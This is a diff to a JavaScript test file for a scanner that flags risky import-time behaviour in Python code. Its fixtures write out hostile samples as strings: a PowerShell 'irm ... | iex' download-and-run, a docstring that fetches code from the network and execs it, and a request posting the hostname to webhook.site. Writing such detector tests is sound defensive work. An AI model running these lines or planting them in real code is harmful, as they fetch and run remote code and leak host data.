@@ -95,8 +95,10 @@ test("import time: prose is read out, PowerShell must be handed to an exec call"
   const run = "import subprocess\nsubprocess.run(\n    [\n        \"powershell\",\n        \"-c\",\n"
     + "        \"irm https://x.invalid/i.ps1 | iex\",\n    ]\n)\n";
   assert.deepEqual(importTimeRisk(run, "py"), [["runs PowerShell that downloads and runs code"], 4]);
+  // (code in a string is a stager's: read on the tree, Python's received
+  // code is the code's, not a string's, as JavaScript's)
   const runDoc = '"""\nimport urllib.request\nexec(urllib.request.urlopen("https://x.invalid/p").read())\n"""\nexec(__doc__)\n';
-  assert.deepEqual(importTimeRisk(runDoc, "py")[0], ["runs code it receives over the network",
+  assert.deepEqual(importTimeRisk(runDoc, "py")[0], ["carries a script that downloads and runs code",
     "runs code it reads back from its own file or a data file shipped with it"]);
   const beacon = 'requests.post("https://webhook.site/0", data=socket.gethostname())';
   // an argument, a continued line, joined to the string before it, an f-string, something after it: code
